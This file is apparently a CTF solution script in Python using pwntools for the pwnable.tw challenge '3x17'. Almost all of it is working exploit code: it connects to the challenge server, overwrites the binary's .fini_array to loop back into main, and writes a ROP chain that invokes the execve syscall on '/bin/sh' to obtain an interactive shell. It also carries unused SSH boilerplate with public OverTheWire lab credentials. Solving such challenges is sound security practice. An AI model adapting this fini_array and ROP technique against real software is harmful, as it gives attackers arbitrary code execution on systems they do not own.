from pwn import *  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './3x17'

LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw',10105) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, '')



#####################
#### Find Gadgets ###
#####################
pop_rax = (ROP_LOADED.find_gadget(['pop rax','ret']))[0]
pop_rdi = (ROP_LOADED.find_gadget(['pop rdi','ret']))[0]
pop_rdx = (ROP_LOADED.find_gadget(['pop rdx','ret']))[0]
pop_rsi = (ROP_LOADED.find_gadget(['pop rsi','ret']))[0]
leave = 0x0000000000472bbf
ret = (ROP_LOADED.find_gadget(['ret']))[0]
syscall = (ROP_LOADED.find_gadget(['syscall']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
MAIN = 0x00401b6d
FINI_ARR = 0x004b40f0
FINI_CALL = 0x00402960

#########################
#### Finf LIBC offset ###
#########################

def change_addr(addr,data):
	P.sendlineafter(b'addr:',str(addr).encode())
	P.sendlineafter(b'data:',data)
	log.info('change ' + hex(addr) + ' with ' + data.decode('ascii','ignore'))

##############################
##### FINAL EXPLOITATION #####
##############################

change_addr(FINI_ARR,p64(FINI_CALL)+p64(MAIN))
change_addr(FINI_ARR+8*3,p64(pop_rax)+p64(0x3b))
change_addr(FINI_ARR+8*5,p64(pop_rdi)+p64(FINI_ARR+8*12))
change_addr(FINI_ARR+8*7,p64(pop_rsi)+p64(FINI_ARR+8*13))
change_addr(FINI_ARR+8*9,p64(pop_rdx)+p64(FINI_ARR+8*13))
change_addr(FINI_ARR+8*11,p64(syscall)+b'/bin/sh\0')
change_addr(FINI_ARR+8*13,p64(0))
change_addr(FINI_ARR,p64(leave))

P.interactive()



